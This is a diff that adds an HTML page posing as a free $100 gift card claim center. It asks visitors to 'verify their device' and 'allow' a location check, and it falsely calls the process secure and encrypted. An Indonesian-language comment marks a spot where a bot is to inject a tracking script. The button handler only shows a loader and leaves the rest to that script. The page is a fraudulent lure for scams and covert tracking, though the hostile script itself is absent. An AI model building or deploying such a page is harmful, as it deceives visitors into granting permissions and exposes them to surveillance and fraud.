@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Gift Card Claim Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333; min-height: 100vh; padding: 20px;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 24px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%; max-width: 500px; overflow: hidden;
+            backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2);
+        }
+        .header {
+            background: linear-gradient(90deg, #4f46e5, #7c3aed);
+            color: white; padding: 30px 20px; text-align: center;
+        }
+        .header h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        .header p { opacity: 0.9; font-size: 1.1rem; }
+        .content { padding: 30px; }
+        .step {
+            display: flex; align-items: center; margin-bottom: 25px;
+            padding: 15px; border-radius: 16px;
+            background: #f8fafc; border-left: 5px solid #10b981;
+        }
+        .step-icon { font-size: 2rem; margin-right: 20px; color: #10b981; }
+        .step-text h3 { color: #1e293b; margin-bottom: 5px; }
+        .step-text p { color: #64748b; line-height: 1.5; }
+        .verification-box {
+            background: #fef3c7; border: 2px dashed #f59e0b;
+            border-radius: 12px; padding: 20px; text-align: center;
+            margin: 25px 0;
+        }
+        .btn {
+            display: block; width: 100%; padding: 18px;
+            background: linear-gradient(90deg, #10b981, #34d399);
+            color: white; text-align: center; border: none;
+            border-radius: 12px; font-size: 1.2rem; font-weight: bold;
+            cursor: pointer; transition: all 0.3s ease; margin-top: 20px;
+            text-decoration: none;
+        }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(16, 185, 129, 0.4); }
+        .footer {
+            text-align: center; padding: 20px; color: #94a3b8;
+            font-size: 0.9rem; border-top: 1px solid #e2e8f0;
+            margin-top: 20px;
+        }
+        .pulse {
+            animation: pulse 2s infinite; display: inline-block;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .loader {
+            border: 5px solid #f3f3f3; border-top: 5px solid #10b981;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 1s linear infinite; margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-gift"></i> $100 Gift Card</h1>
+            <p>Claim your free reward in just 2 steps</p>
+        </div>
+        <div class="content">
+            <div class="step">
+                <div class="step-icon"><i class="fas fa-user-check"></i></div>
+                <div class="step-text">
+                    <h3>Step 1: Account Verification</h3>
+                    <p>We need to verify your device to prevent fraud. This is a one-time process.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-icon"><i class="fas fa-map-marker-alt"></i></div>
+                <div class="step-text">
+                    <h3>Step 2: Location Check</h3>
+                    <p>Confirm your region to unlock eligible gift cards for your country.</p>
+                </div>
+            </div>
+            <div class="verification-box">
+                <h3><i class="fas fa-shield-alt"></i> Security Verification</h3>
+                <p>Click "Allow" when prompted to verify your device. This is required to proceed.</p>
+            </div>
+            <div class="loader" id="loader"></div>
+            <button class="btn pulse" id="verifyBtn">
+                <i class="fas fa-lock"></i> VERIFY DEVICE TO CLAIM
+            </button>
+            <p style="text-align:center; margin-top:15px; color:#94a3b8; font-size:0.85rem;">
+                <i class="fas fa-info-circle"></i> This process is secure and encrypted.
+            </p>
+        </div>
+        <div class="footer">
+            © 2024 GiftCard Inc. • Protecting your privacy
+        </div>
+    </div>
+    <!-- SCRIPT PELACAKAN AKAN DIINJEKSI DI SINI OLEH BOT -->
+    <div id="injection-point"></div>
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            this.style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            // Script injeksi akan menangani sisanya
+        });
+    </script>
+</body>
+</html>
